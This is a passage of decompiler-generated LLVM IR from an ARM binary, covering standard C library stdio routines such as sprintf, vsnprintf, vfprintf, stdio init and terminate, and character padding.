  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_143e4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_143e4, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_143f8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_143f8

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_1440c = load i32, i32* @r4, align 4
  %v6_1440c = load i32, i32* @r5, align 4
  %v9_1440c = load i32, i32* @r6, align 4
  %v12_1440c = load i32, i32* @r7, align 4
  %v18_1440c = load i32, i32* @sl, align 4
  %v2_14414 = ptrtoint i32* %stack_var_-108 to i32
  %v0_14420 = load i32, i32* @r0, align 4
  store i32 %v0_14420, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_14428 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_14428, i32* @r0, align 4
  %v0_14434 = load i32, i32* @r1, align 4
  store i32 %v0_14434, i32* @r5, align 4
  %v0_14438 = load i32, i32* @r2, align 4
  store i32 %v0_14438, i32* @r6, align 4
  %v0_1443c = load i32, i32* @r3, align 4
  store i32 %v0_1443c, i32* @r7, align 4
  store i32 0, i32* %stack_var_-108, align 4
  %v1_14450 = call i32 @__stdio_init_mutex(i32 %v2_14428)
  %v0_14454 = load i32, i32* @r4, align 4
  %v1_14454 = sub i32 -1, %v0_14454
  %v0_14458 = load i32, i32* @r5, align 4
  %v3_14458 = icmp ult i32 %v0_14458, %v1_14454
  br i1 %v3_14458, label %bb25, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_14454, i32* @r5, align 4
  br label %bb25

bb25:                                             ; preds = %entry, %bb
  %v1_14460 = phi i32 [ %v0_14458, %entry ], [ %v1_14454, %bb ]
  %v0_14468 = load i32, i32* @r6, align 4
  %v0_1446c = load i32, i32* @r7, align 4
  %v3_1448c = inttoptr i32 %v0_14468 to i8*
  %v4_1448c = call i32 @_vfprintf_internal(i32 %v2_14414, i8* %v3_1448c, i32 %v0_1446c)
  %v0_14490 = load i32, i32* @r5, align 4
  %v1_14490 = load i32, i32* @sl, align 4
  %v9_14490 = icmp eq i32 %v0_14490, %v1_14490
  br i1 %v9_14490, label %dec_label_pc_144b8, label %dec_label_pc_1449c

dec_label_pc_1449c:                               ; preds = %bb25
  %v2_14460 = add i32 %v1_14460, %v0_14454
  %v9_144a4 = icmp eq i32 %v1_14460, 0
  br i1 %v9_144a4, label %bb26, label %bb27

bb26:                                             ; preds = %dec_label_pc_1449c
  %v2_144a8 = add i32 %v0_14454, -1
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1449c, %bb26
  %v1_144ac = phi i32 [ %v2_14460, %dec_label_pc_1449c ], [ %v2_144a8, %bb26 ]
  %v1_144ac.v0_14484 = select i1 %v9_144a4, i32 %v1_144ac, i32 %v0_14454
  %stack_var_-92.0 = inttoptr i32 %v1_144ac.v0_14484 to i8*
  %v1_144b4 = trunc i32 %v1_14490 to i8
  store i8 %v1_144b4, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_144b8

dec_label_pc_144b8:                               ; preds = %bb25, %bb27
  store i32 %v3_1440c, i32* @r4, align 4
  store i32 %v6_1440c, i32* @r5, align 4
  store i32 %v9_1440c, i32* @r6, align 4
  store i32 %v12_1440c, i32* @r7, align 4
  store i32 %v18_1440c, i32* @sl, align 4
  ret i32 %v4_1448c

; uselistorder directives
  uselistorder i1 %v9_144a4, { 1, 0 }
  uselistorder i32 %v1_14460, { 1, 0 }
  uselistorder i32 %v1_14454, { 2, 1, 0 }
  uselistorder i32 %v0_14454, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_144b8, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_144c0 = load i32, i32* @r4, align 4
  store i32 %v3_144c0, i32* %stack_var_-12, align 4
  %v6_144c0 = load i32, i32* @r5, align 4
  %v0_144c4 = call i32 @__GI___errno_location()
  store i32 %v0_144c4, i32* @r4, align 4
  store i32 0, i32* @r0, align 4
  %v1_144d0 = inttoptr i32 %v0_144c4 to i32*
  %v2_144d0 = load i32, i32* %v1_144d0, align 4
  store i32 %v2_144d0, i32* @r5, align 4
  %v1_144d4 = call i32 @isatty(i32 0)
  %v2_144d8 = icmp eq i32 %v1_144d4, 0
  br i1 %v2_144d8, label %dec_label_pc_144e0, label %dec_label_pc_14500

dec_label_pc_144e0:                               ; preds = %entry
  %v2_144e4 = load i8, i8* bitcast (i8** @global_var_2e23c.1311 to i8*), align 4
  %v3_144e4 = zext i8 %v2_144e4 to i32
  %v3_144e8 = load i8, i8* @global_var_2e23d.1318, align 1
  %v4_144e8 = zext i8 %v3_144e8 to i32
  %v4_144ec = mul nuw nsw i32 %v3_144e4, 256
  %v5_144ec = or i32 %v4_144e8, %v4_144ec
  %v1_144f0 = xor i32 %v5_144ec, 256
  %v3_144f41 = udiv i32 %v1_144f0, 256
  %v1_144f8 = trunc i32 %v3_144f41 to i8
  store i8 %v1_144f8, i8* bitcast (i8** @global_var_2e23c.1311 to i8*), align 4
  br label %dec_label_pc_14500

dec_label_pc_14500:                               ; preds = %entry, %dec_label_pc_144e0
  store i32 1, i32* @r0, align 4
  %v1_14504 = call i32 @isatty(i32 1)
  %v2_14508 = icmp eq i32 %v1_14504, 0
  br i1 %v2_14508, label %dec_label_pc_14510, label %dec_label_pc_14530

dec_label_pc_14510:                               ; preds = %dec_label_pc_14500
  %v3_14514 = load i8, i8* @global_var_2e28c.1312, align 1
  %v4_14514 = zext i8 %v3_14514 to i32
  %v3_14518 = load i8, i8* @global_var_2e28d.1319, align 1
  %v4_14518 = zext i8 %v3_14518 to i32
  %v4_1451c = mul nuw nsw i32 %v4_14514, 256
  %v5_1451c = or i32 %v4_14518, %v4_1451c
  %v1_14520 = xor i32 %v5_1451c, 256
  %v3_145242 = udiv i32 %v1_14520, 256
  %v1_14528 = trunc i32 %v3_145242 to i8
  store i8 %v1_14528, i8* @global_var_2e28c.1312, align 1
  br label %dec_label_pc_14530

dec_label_pc_14530:                               ; preds = %dec_label_pc_14500, %dec_label_pc_14510
  %v0_14530 = load i32, i32* @r5, align 4
  %v1_14530 = load i32, i32* @r4, align 4
  %v2_14530 = inttoptr i32 %v1_14530 to i32*
  store i32 %v0_14530, i32* %v2_14530, align 4
  %v2_14534 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14534, i32* @r4, align 4
  store i32 %v6_144c0, i32* @r5, align 4
  ret i32 %v1_14504

; uselistorder directives
  uselistorder i8* @global_var_2e28c.1312, { 1, 0 }
  uselistorder label %dec_label_pc_14530, { 1, 0 }
  uselistorder label %dec_label_pc_14500, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24668.1321 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14544 = call i32 @memcpy()
  %v0_14548 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14548, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_14548 = load i32, i32* @r2, align 4
  %v2_14548 = load i32, i32* @r8, align 4
  %v3_14548 = udiv i32 %v2_14548, 4096
  %v4_14548 = mul i32 %v2_14548, 1048576
  %v5_14548 = or i32 %v3_14548, %v4_14548
  %v8_14548 = and i32 %v5_14548, %v1_14548
  store i32 %v8_14548, i32* @r4, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_14544

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1454c = load i32, i32* @r4, align 4
  store i32 %v3_1454c, i32* %stack_var_-28, align 4
  %v15_1454c = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_2e208.1323 to i32), i32* @r0, align 4
  %v1_14554 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_2e208.1323 to i32))
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* @r0, align 4
  %v1_1455c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_2e220.1325 to i32))
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* %r3.global-to-local, align 4
  %v2_14568 = load i32, i32* bitcast (i32** @global_var_2e204.1327 to i32*), align 4
  store i32 %v2_14568, i32* @r4, align 4
  store i32 0, i32* @r8, align 4
  store i32 48, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  %v1_145b84 = add i32 %v2_14568, 56
  store i32 %v1_145b84, i32* @r5, align 4
  %v2_145bc6 = icmp eq i32 %v2_14568, 0
  store i32 %v1_145b84, i32* %r0.global-to-local, align 4
  br i1 %v2_145bc6, label %dec_label_pc_145c8, label %dec_label_pc_1457c

dec_label_pc_1457c:                               ; preds = %entry, %dec_label_pc_145ac
  %v1_14580 = phi i32 [ %v1_145b8, %dec_label_pc_145ac ], [ %v1_145b84, %entry ]
  store i32 83332, i32* @lr, align 4
  %v2_14580 = call i32 @__pthread_return_0(i32 %v1_14580)
  %v2_14584 = icmp eq i32 %v2_14580, 0
  %v0_14588 = load i32, i32* @r5, align 4
  store i32 %v0_14588, i32* @r0, align 4
  br i1 %v2_14584, label %dec_label_pc_145ac, label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_1457c
  %v0_14590 = load i32, i32* @r4, align 4
  %v1_14590 = add i32 %v0_14590, 8
  %v2_14590 = inttoptr i32 %v1_14590 to i32*
  %v3_14590 = load i32, i32* %v2_14590, align 4
  store i32 %v3_14590, i32* %r3.global-to-local, align 4
  %v0_14594 = load i32, i32* @r8, align 4
  %v1_14594 = trunc i32 %v0_14594 to i8
  %v3_14594 = inttoptr i32 %v0_14590 to i8*
  store i8 %v1_14594, i8* %v3_14594, align 1
  %v0_14598 = load i32, i32* %r3.global-to-local, align 4
  %v1_14598 = load i32, i32* @r4, align 4
  %v2_14598 = add i32 %v1_14598, 20
  %v3_14598 = inttoptr i32 %v2_14598 to i32*
  store i32 %v0_14598, i32* %v3_14598, align 4
  %v0_1459c = load i32, i32* %r7.global-to-local, align 4
  %v1_1459c = trunc i32 %v0_1459c to i8
  %v2_1459c = load i32, i32* @r4, align 4
  %v3_1459c = add i32 %v2_1459c, 1
  %v4_1459c = inttoptr i32 %v3_1459c to i8*
  store i8 %v1_1459c, i8* %v4_1459c, align 1
  %v0_145a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_145a0 = load i32, i32* @r4, align 4
  %v2_145a0 = add i32 %v1_145a0, 24
  %v3_145a0 = inttoptr i32 %v2_145a0 to i32*
  store i32 %v0_145a0, i32* %v3_145a0, align 4
  %v0_145a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_145a4 = load i32, i32* @r4, align 4
  %v2_145a4 = add i32 %v1_145a4, 28
  %v3_145a4 = inttoptr i32 %v2_145a4 to i32*
  store i32 %v0_145a4, i32* %v3_145a4, align 4
  %v0_145a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_145a8 = load i32, i32* @r4, align 4
  %v2_145a8 = add i32 %v1_145a8, 16
  %v3_145a8 = inttoptr i32 %v2_145a8 to i32*
  store i32 %v0_145a8, i32* %v3_145a8, align 4
  br label %dec_label_pc_145ac

dec_label_pc_145ac:                               ; preds = %dec_label_pc_1457c, %dec_label_pc_14590
  %v0_145ac = load i32, i32* %r6.global-to-local, align 4
  %v1_145ac = load i32, i32* @r4, align 4
  %v2_145ac = add i32 %v1_145ac, 52
  %v3_145ac = inttoptr i32 %v2_145ac to i32*
  store i32 %v0_145ac, i32* %v3_145ac, align 4
  %v1_145b0 = call i32 @__stdio_init_mutex(i32 %v0_14588)
  store i32 %v1_145b0, i32* %r0.global-to-local, align 4
  %v0_145b4 = load i32, i32* @r4, align 4
  %v1_145b4 = add i32 %v0_145b4, 32
  %v2_145b4 = inttoptr i32 %v1_145b4 to i32*
  %v3_145b4 = load i32, i32* %v2_145b4, align 4
  store i32 %v3_145b4, i32* @r4, align 4
  %v1_145b8 = add i32 %v3_145b4, 56
  store i32 %v1_145b8, i32* @r5, align 4
  %v2_145bc = icmp eq i32 %v3_145b4, 0
  store i32 %v1_145b8, i32* %r0.global-to-local, align 4
  br i1 %v2_145bc, label %dec_label_pc_145b8.dec_label_pc_145c8_crit_edge, label %dec_label_pc_1457c

dec_label_pc_145b8.dec_label_pc_145c8_crit_edge:  ; preds = %dec_label_pc_145ac
  %storemerge1.pre = load i32, i32* bitcast (i32** @global_var_2e204.1327 to i32*), align 4
  br label %dec_label_pc_145c8

dec_label_pc_145c8:                               ; preds = %dec_label_pc_145b8.dec_label_pc_145c8_crit_edge, %entry
  %v23_145f012 = phi i32 [ %v1_145b8, %dec_label_pc_145b8.dec_label_pc_145c8_crit_edge ], [ %v1_145b84, %entry ]
  %storemerge1 = phi i32 [ %storemerge1.pre, %dec_label_pc_145b8.dec_label_pc_145c8_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_145e83 = icmp eq i32 %storemerge1, 0
  br i1 %v2_145e83, label %dec_label_pc_145f0, label %dec_label_pc_145d4

dec_label_pc_145d4:                               ; preds = %dec_label_pc_145c8, %dec_label_pc_145e8
  %v1_145dc = phi i32 [ %storemerge, %dec_label_pc_145e8 ], [ %storemerge1, %dec_label_pc_145c8 ]
  %v1_145d4 = add i32 %v1_145dc, 1
  %v2_145d4 = inttoptr i32 %v1_145d4 to i8*
  %v3_145d4 = load i8, i8* %v2_145d4, align 1
  %v4_145d4 = zext i8 %v3_145d4 to i32
  store i32 %v4_145d4, i32* %r3.global-to-local, align 4
  %v1_145d8 = and i32 %v4_145d4, 64
  %v2_145d8 = icmp eq i32 %v1_145d8, 0
  br i1 %v2_145d8, label %dec_label_pc_145e8, label %bb

bb:                                               ; preds = %dec_label_pc_145d4
  store i32 %v1_145dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145d4, %bb
  store i32 83428, i32* @lr, align 4
  %v1_145e0 = xor i1 %v2_145d8, true
  call void @__pseudo_cond_branch(i1 %v1_145e0, i32 ptrtoint (i32* @global_var_14604.1330 to i32))
  %v0_145e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_145e4 = add i32 %v0_145e4, 32
  %v2_145e4 = inttoptr i32 %v1_145e4 to i32*
  %storemerge = load i32, i32* %v2_145e4, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_145e8 = icmp eq i32 %storemerge, 0
  br i1 %v2_145e8, label %dec_label_pc_145e8.dec_label_pc_145f0_crit_edge, label %dec_label_pc_145d4

dec_label_pc_145e8.dec_label_pc_145f0_crit_edge:  ; preds = %dec_label_pc_145e8
  %v23_145f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145f0

dec_label_pc_145f0:                               ; preds = %dec_label_pc_145e8.dec_label_pc_145f0_crit_edge, %dec_label_pc_145c8
  %v23_145f0 = phi i32 [ %v23_145f0.pre, %dec_label_pc_145e8.dec_label_pc_145f0_crit_edge ], [ %v23_145f012, %dec_label_pc_145c8 ]
  %v2_145f0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_145f0, i32* @r4, align 4
  store i32 %v15_1454c, i32* @r8, align 4
  ret i32 %v23_145f0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %storemerge1, { 0, 2, 1 }
  uselistorder i32 %v1_145b8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_145b84, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_145e8, { 1, 0 }
  uselistorder label %dec_label_pc_145d4, { 1, 0 }
  uselistorder label %dec_label_pc_145ac, { 1, 0 }
  uselistorder label %dec_label_pc_1457c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14604 = load i32, i32* @r4, align 4
  store i32 %v3_14604, i32* %stack_var_-8, align 4
  %v0_14608 = load i32, i32* @r0, align 4
  %v1_14608 = add i32 %v0_14608, 8
  %v2_14608 = inttoptr i32 %v1_14608 to i32*
  %v3_14608 = load i32, i32* %v2_14608, align 4
  %v1_1460c = add i32 %v0_14608, 16
  %v2_1460c = inttoptr i32 %v1_1460c to i32*
  %v3_1460c = load i32, i32* %v2_1460c, align 4
  %v9_14610 = icmp eq i32 %v3_1460c, %v3_14608
  store i32 %v0_14608, i32* %r4.global-to-local, align 4
  br i1 %v9_14610, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_14608, i32* %v2_1460c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 83488, i32* @lr, align 4
  %v1_1461c = xor i1 %v9_14610, true
  call void @__pseudo_cond_branch(i1 %v1_1461c, i32 ptrtoint (i32* @global_var_19220.1331 to i32))
  %v0_14620 = load i32, i32* %r4.global-to-local, align 4
  %v1_14620 = add i32 %v0_14620, 8
  %v2_14620 = inttoptr i32 %v1_14620 to i32*
  %v3_14620 = load i32, i32* %v2_14620, align 4
  %v1_14624 = add i32 %v0_14620, 16
  %v2_14624 = inttoptr i32 %v1_14624 to i32*
  %v3_14624 = load i32, i32* %v2_14624, align 4
  %v2_14628 = sub i32 %v3_14624, %v3_14620
  %v2_1462c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1462c, i32* @r4, align 4
  ret i32 %v2_14628

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14630 = load i32, i32* @r4, align 4
  store i32 %v3_14630, i32* %stack_var_-24, align 4
  %v0_14634 = load i32, i32* @r0, align 4
  %v1_14634 = add i32 %v0_14634, 52
  %v2_14634 = inttoptr i32 %v1_14634 to i32*
  %v3_14634 = load i32, i32* %v2_14634, align 4
  %v1_14638 = sub i32 1, %v3_14634
  %v2_14638 = icmp ult i32 %v3_14634, 2
  br i1 %v2_14638, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge20 = phi i32 [ 0, %bb ], [ %v1_14638, %entry ]
  %v0_14640 = phi i32 [ 0, %bb ], [ %v1_14638, %entry ]
  store i32 %storemerge20, i32* @r6, align 4
  %v2_14640 = icmp eq i32 %v0_14640, 0
  store i32 %v0_14634, i32* @r5, align 4
  %v0_1464c = load i32, i32* @r1, align 4
  store i32 %v0_1464c, i32* @r7, align 4
  %v0_14650 = load i32, i32* @r2, align 4
  store i32 %v0_14650, i32* @r8, align 4
  br i1 %v2_14640, label %dec_label_pc_14684, label %dec_label_pc_14658

dec_label_pc_14658:                               ; preds = %bb16
  %v2_14644 = ptrtoint i32* %stack_var_-40 to i32
  %v1_14658 = add i32 %v0_14634, 56
  store i32 %v1_14658, i32* @r4, align 4
  store i32 %v2_14644, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v1_14658, i32* @r2, align 4
  %v1_14670 = call i32 @_pthread_cleanup_push_defer()
  %v0_14674 = load i32, i32* @r4, align 4
  store i32 83588, i32* @lr, align 4
  %v2_14680 = call i32 @__pthread_return_0(i32 %v0_14674)
  %v0_14684.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14684

dec_label_pc_14684:                               ; preds = %bb16, %dec_label_pc_14658
  %v0_14694 = phi i32 [ %v0_14634, %bb16 ], [ %v0_14684.pre, %dec_label_pc_14658 ]
  %v1_14684 = add i32 %v0_14694, 1
  %v2_14684 = inttoptr i32 %v1_14684 to i8*
  %v3_14684 = load i8, i8* %v2_14684, align 1
  %v2_1468c = icmp ugt i8 %v3_14684, -65
  br i1 %v2_1468c, label %dec_label_pc_146ac, label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %dec_label_pc_14684
  %v2_1469c = inttoptr i32 %v0_14694 to i8*
  %v3_1469c = call i32 @__stdio_trans2w_o(i8* %v2_1469c, i32 128)
  %v2_146a0 = icmp eq i32 %v3_1469c, 0
  br i1 %v2_146a0, label %dec_label_pc_14694.dec_label_pc_146ac_crit_edge, label %dec_label_pc_146c0

dec_label_pc_14694.dec_label_pc_146ac_crit_edge:  ; preds = %dec_label_pc_14694
  %v0_146ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_146ac

dec_label_pc_146ac:                               ; preds = %dec_label_pc_14694.dec_label_pc_146ac_crit_edge, %dec_label_pc_14684
  %v0_146ac = phi i32 [ %v0_146ac.pre, %dec_label_pc_14694.dec_label_pc_146ac_crit_edge ], [ %v0_14694, %dec_label_pc_14684 ]
  %v0_146b0 = load i32, i32* @r7, align 4
  %v0_146b4 = load i32, i32* @r8, align 4
  %v3_146b8 = inttoptr i32 %v0_146b0 to i8*
  %v4_146b8 = call i32 @_vfprintf_internal(i32 %v0_146ac, i8* %v3_146b8, i32 %v0_146b4)
  br label %dec_label_pc_146c0

dec_label_pc_146c0:                               ; preds = %dec_label_pc_14694, %dec_label_pc_146ac
  %storemerge = phi i32 [ %v4_146b8, %dec_label_pc_146ac ], [ -1, %dec_label_pc_14694 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_146c0 = load i32, i32* @r6, align 4
  %v2_146c0 = icmp eq i32 %v0_146c0, 0
  br i1 %v2_146c0, label %.thread4, label %bb18

bb18:                                             ; preds = %dec_label_pc_146c0
  call void @__pseudo_branch(i32 98448)
  %v0_146d8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_146c0, %bb18
  %v0_146d8 = phi i32 [ %storemerge, %dec_label_pc_146c0 ], [ %v0_146d8.pre, %bb18 ]
  %v2_146e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_146e0, i32* %r4.global-to-local, align 4
  ret i32 %v0_146d8

; uselistorder directives
  uselistorder i32 %v3_14634, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_146c0, { 1, 0 }
  uselistorder label %dec_label_pc_14684, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-21 = alloca i8, align 1
  %v3_146f4 = load i32, i32* @r4, align 4
  %v6_146f4 = load i32, i32* @r5, align 4
  %v9_146f4 = load i32, i32* @r6, align 4
  %v12_146f4 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-21, align 1
  %v10_14700 = ptrtoint i8* %stack_var_-21 to i32
  store i32 %v10_14700, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_147182 = icmp eq i32 %arg3, 0
  br i1 %v2_147182, label %dec_label_pc_14738, label %dec_label_pc_1472c

dec_label_pc_14714:                               ; preds = %dec_label_pc_1472c
  %v1_14714 = add i32 %v0_14714, -1
  store i32 %v1_14714, i32* @r4, align 4
  %v2_14718 = icmp eq i32 %v1_14714, 0
  %v0_14724 = load i32, i32* @r7, align 4
  br i1 %v2_14718, label %dec_label_pc_14738.loopexit, label %dec_label_pc_1472c

dec_label_pc_1472c:                               ; preds = %entry, %dec_label_pc_14714
  %v0_147244 = phi i32 [ %v0_14724, %dec_label_pc_14714 ], [ %arg1, %entry ]
  %v3_1472c = inttoptr i32 %v0_147244 to i8*
  %v4_1472c = call i32 @__stdio_fwrite(i32 %v10_14700, i32 1, i8* %v3_1472c)
  %v7_14730 = icmp eq i32 %v4_1472c, 1
  %v0_14714 = load i32, i32* @r4, align 4
  br i1 %v7_14730, label %dec_label_pc_14714, label %dec_label_pc_14738.loopexit

dec_label_pc_14738.loopexit:                      ; preds = %dec_label_pc_14714, %dec_label_pc_1472c
  %v0_14738.ph = phi i32 [ %v0_14714, %dec_label_pc_1472c ], [ 0, %dec_label_pc_14714 ]
  %v1_14738.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %dec_label_pc_14738.loopexit, %entry
  %v1_14738 = phi i32 [ 0, %entry ], [ %v1_14738.pre, %dec_label_pc_14738.loopexit ]
  %v0_14738 = phi i32 [ 0, %entry ], [ %v0_14738.ph, %dec_label_pc_14738.loopexit ]
  %v2_14738 = sub i32 %v1_14738, %v0_14738
  store i32 %v3_146f4, i32* @r4, align 4
  store i32 %v6_146f4, i32* @r5, align 4
  store i32 %v9_146f4, i32* @r6, align 4
  store i32 %v12_146f4, i32* @r7, align 4
  ret i32 %v2_14738

; uselistorder directives
  uselistorder i32 %v1_14714, { 1, 0 }
  uselistorder label %dec_label_pc_14738.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1472c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14744 = load i32, i32* @r4, align 4
  store i32 %v3_14744, i32* %stack_var_-24, align 4
  %v6_14744 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_1474c = and i32 %arg2, 128
  %v2_1474c = icmp eq i32 %v1_1474c, 0
  %v0_14750 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14750, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_1474c, label %dec_label_pc_147a0thread-pre-split, label %dec_label_pc_14764

dec_label_pc_14764:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14768 = call i32 @strlen(i8* %arg4)
  store i32 %v3_14768, i32* %r0.global-to-local, align 4
  %v1_1476c = load i32, i32* %r4.global-to-local, align 4
  %v2_1476c = sub i32 %v1_1476c, %v3_14768
  store i32 %v2_1476c, i32* @r4, align 4
  store i32 %v3_14768, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_1476c, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_14780

.thread:                                          ; preds = %dec_label_pc_14764
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1479c

dec_label_pc_14780:                               ; preds = %dec_label_pc_14764
  %v0_14780 = load i32, i32* @r5, align 4
  %v1_14780 = urem i32 %v0_14780, 128
  %v0_14784 = load i32, i32* @r8, align 4
  store i32 %v0_14784, i32* %r0.global-to-local, align 4
  %v3_1478c = trunc i32 %v1_14780 to i8
  %v4_1478c = call i32 @_charpad(i32 %v0_14784, i8 %v3_1478c, i32 %v2_1476c)
  store i32 %v4_1478c, i32* %r0.global-to-local, align 4
  %v1_14790 = load i32, i32* @r4, align 4
  %v9_14790 = icmp eq i32 %v4_1478c, %v1_14790
  store i32 %v4_1478c, i32* %r5.global-to-local, align 4
  br i1 %v9_14790, label %dec_label_pc_14780.dec_label_pc_1479c_crit_edge, label %dec_label_pc_147bc

dec_label_pc_14780.dec_label_pc_1479c_crit_edge:  ; preds = %dec_label_pc_14780
  %v0_1479c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %.thread, %dec_label_pc_14780.dec_label_pc_1479c_crit_edge
  %v0_1479c = phi i32 [ %v0_1479c.pre, %dec_label_pc_14780.dec_label_pc_1479c_crit_edge ], [ %v3_14768, %.thread ]
  store i32 %v0_1479c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147a0

dec_label_pc_147a0thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_147a0

dec_label_pc_147a0:                               ; preds = %dec_label_pc_147a0thread-pre-split, %dec_label_pc_1479c
  %v5_147ac = phi i32 [ %arg3, %dec_label_pc_147a0thread-pre-split ], [ %v0_1479c, %dec_label_pc_1479c ]
  %tmp14 = icmp slt i32 %v5_147ac, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_147a0
  br label %bb15

bb:                                               ; preds = %dec_label_pc_147a0
  %v5_147a8 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
